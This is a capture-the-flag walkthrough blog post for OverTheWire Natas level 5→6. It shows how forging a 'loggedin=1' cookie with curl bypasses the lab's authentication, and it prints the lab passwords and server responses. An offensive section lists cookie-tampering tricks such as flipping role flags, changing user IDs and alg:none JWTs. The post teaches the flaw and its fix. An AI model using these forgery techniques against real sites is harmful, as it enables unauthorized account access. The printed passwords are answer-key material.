---
title: "OverTheWire Natas Level 5 → 6: Cookie Manipulation"
description: "Natas Level 5 checks a cookie named 'loggedin' to decide whether to grant access. The cookie is client-controlled. Setting it to 1 is the entire attack."
date: 2026-06-07
platform: OverTheWire
difficulty: easy
tags: [ctf, web, natas, overthewire, cookies, cookie-manipulation, http-headers]
series: "OverTheWire Natas"
order: 5
seriesLabel: "Level 5 → 6"
draft: false
---

> Part of a complete level-by-level Natas series. Each post is self-contained — if you want context on the setup and tooling, start with the [Intro & Setup](../natas-00-introduction/) post.

## Introduction

Level 5 is about cookies. The application sets a cookie named `loggedin` with a value of `0` when you first visit, and then checks that cookie on every subsequent request to decide whether you are "logged in." The mistake is obvious once you see it: the server trusts the value the client sends back in the cookie. We can send any cookie value we want. Sending `loggedin=1` is all it takes to get the application to grant access.

This is a critical concept because cookies are the foundation of session management on the web, and cookie-based session flaws are a recurring category of real-world vulnerabilities — from session fixation to session hijacking to exactly this: predictable or forgeable session state stored in a client-controlled cookie.

## Official Challenge Objective

> **Access disallowed. You are not logged in.**

## Skills Covered

- HTTP cookie mechanics: how Set-Cookie and Cookie headers work
- Inspecting response headers with `curl -v` to find Set-Cookie
- Setting custom cookies in curl with `-b` and `-H "Cookie: ..."`
- Recognising insecure client-side session state storage
- Understanding why trusting cookie values from the client is broken authentication

## My Approach

My first step on any level that talks about access control is to check the response headers — `curl -v` and look for `Set-Cookie`. Sure enough, the server hands back `loggedin=0`. I immediately knew the solve: flip it to `1` and send it back. I confirmed with two different curl approaches to show both methods, since you will use both styles depending on context.

## Step-by-Step Walkthrough

### Command

```bash
curl -v http://natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK@natas5.natas.labs.overthewire.org/
```

### Explanation

Using `-v` to see all headers. The relevant response headers:

```
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
< Set-Cookie: loggedin=0
<
...
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in
</div>
```

The server sets `loggedin=0` in the response. On the next request, a compliant browser would echo this cookie back. The server then reads the cookie's value and decides we are not logged in. We need to send `loggedin=1` instead.

### Why It Matters

`Set-Cookie` response headers are the server's way of storing state in the client's browser. The cookie is then included in subsequent requests to the same domain via the `Cookie` request header. The browser does this automatically. curl does not — you have to tell it explicitly what cookies to send. This makes curl excellent for cookie manipulation testing, because you are in full control of what goes in the Cookie header.

---

### Command

```bash
curl -b "loggedin=1" http://natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK@natas5.natas.labs.overthewire.org/
```

### Explanation

The `-b "name=value"` flag sends that string as the `Cookie` request header. curl transmits:

```
Cookie: loggedin=1
```

The server reads `loggedin=1`, decides we are logged in, and returns:

```
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

The natas6 password is `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`.

Note: the response also now includes `Set-Cookie: loggedin=1`, which is slightly amusing — the server is confirming our forged state back to us.

### Why It Matters

The `-b` flag is how you replay cookie values in curl. In real testing, this is how you test what happens when you modify session tokens, role flags, user ID values, or other state stored in cookies. The ability to arbitrarily set any cookie value is the prerequisite for testing every cookie-based vulnerability.

---

### Command

```bash
# Equivalent using the generic -H flag for manual header injection
curl -H "Cookie: loggedin=1" \
     http://natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK@natas5.natas.labs.overthewire.org/
```

### Explanation

`-H "Header: value"` adds an arbitrary HTTP request header. Setting the `Cookie` header directly is equivalent to `-b` for simple cases. The `-H` approach is useful when you need to set multiple cookies alongside other custom headers, since you can combine them: `-H "Cookie: a=1; b=2" -H "X-Custom: foo"`.

### Why It Matters

Understanding that cookies are just key-value pairs in the `Cookie` request header — nothing more magical than that — is fundamental to cookie manipulation. Anything that goes in a `Cookie` header can be set by any HTTP client.

## Deep Dive: Cyber Security Concept

**Client-side session state and insecure direct object reference in cookies.**

The vulnerability here is that the application stores the authentication state (`loggedin=0|1`) in a client-controlled location (the cookie) and then trusts the value the client sends back without any server-side verification.

A properly implemented session management system works differently: when a user authenticates successfully, the server generates a **random, unpredictable session token** (e.g., a 256-bit random value), stores the session state (including "is logged in: true") on the **server side** in a database or memory store, and sends the session token to the client in a cookie. On subsequent requests, the client sends back the token; the server looks it up in its own store to find the associated session state. The client never controls the state — only the token.

What Level 5 implements is entirely different: the state itself (`loggedin=1`) is in the cookie. The server does not look anything up — it just reads the cookie value and acts on it. Since the client controls the cookie, the client controls the authentication state.

> [!IMPORTANT]
> Never store authentication or authorisation state in a client-controlled location (cookies, localStorage, URL parameters, hidden form fields) where the client can modify it directly. Store state server-side and give the client an unguessable token that references the server-side record.

## Offensive Security Perspective

Cookie manipulation vulnerabilities span a spectrum of severity:

- **Boolean flags** (as here): the simplest case. Flip `admin=0` to `admin=1`, `role=user` to `role=admin`, `loggedin=0` to `loggedin=1`. Often trivial to find with a quick look at DevTools or curl -v.
- **Insecure Direct Object Reference in cookies**: storing a user ID like `userid=1042` and trusting it to retrieve account data. Change the ID to another user's ID and you access their account.
- **Unsigned/unencrypted session tokens**: base64-encoded JSON in a cookie ("JWT-lite" done wrong) where you can decode, modify, and re-encode without a signature check.
- **Signed but weak tokens**: JWTs with algorithm confusion (`alg: none`) or weak secrets that can be brute-forced.

In real bug bounty and pentesting, I always check cookie values in DevTools or Burp Suite on every authenticated endpoint. Anything that looks like a role, a user ID, a boolean, or a predictable token gets modified and replayed.

## Common Beginner Mistakes

- Not running `curl -v` and missing the `Set-Cookie` header entirely, then not knowing what to manipulate.
- Trying to find the "login page" when there is not one — this level uses a cookie to simulate a login state.
- Using `-b` with the wrong cookie name (using `loggedIn` instead of `loggedin` — case-sensitive).
- Not realising that `loggedin=2` or any non-zero value would probably also work, since the server likely checks truthiness rather than strict equality to `1`.

## Key Takeaways

- Cookies are sent by the client in the `Cookie` request header — the client controls the value.
- `curl -v` reveals `Set-Cookie` response headers, which tell you what cookie names the server uses and what default values it assigns.
- `-b "name=value"` in curl sends a custom cookie; `-H "Cookie: name=value"` does the same thing more explicitly.
- Storing authentication state in a cookie value (instead of a random server-side session token) means the client controls whether they are logged in.
- Real session management generates a random server-side session ID; the client holds only an opaque token, not the state itself.

## How This Helps Build Cyber Security Expertise

- **Session management testing:** inspecting and modifying cookies is a core web pentesting skill taught in OWASP's testing guide under authentication testing.
- **Broken authentication:** cookie-based auth flaws are a classic OWASP A07:2021 (Identification and Authentication Failures) finding.
- **JWT security:** the same concept scales to JSON Web Tokens — many JWT vulnerabilities involve the client modifying the payload when the signature is not properly verified.
- **Burp Suite cookie editing:** manipulating cookies in Burp's Repeater or using the Cookie Jar is a direct application of this skill on real targets.

## Additional Reading

- [MDN — HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP — Testing for Cookie Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)
- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger — Cookie-based vulnerabilities](https://portswigger.net/web-security/authentication)

---

## Connect with the Author

Written by **Himangshu Pan** — cybersecurity researcher.

- **GitHub:** [@0xSh3ru](https://github.com/0xSh3ru)
- **LinkedIn:** [in/0xsh3ru](https://www.linkedin.com/in/0xsh3ru/)

*If this walkthrough helped, follow along on GitHub and connect on LinkedIn — questions and corrections are always welcome.*
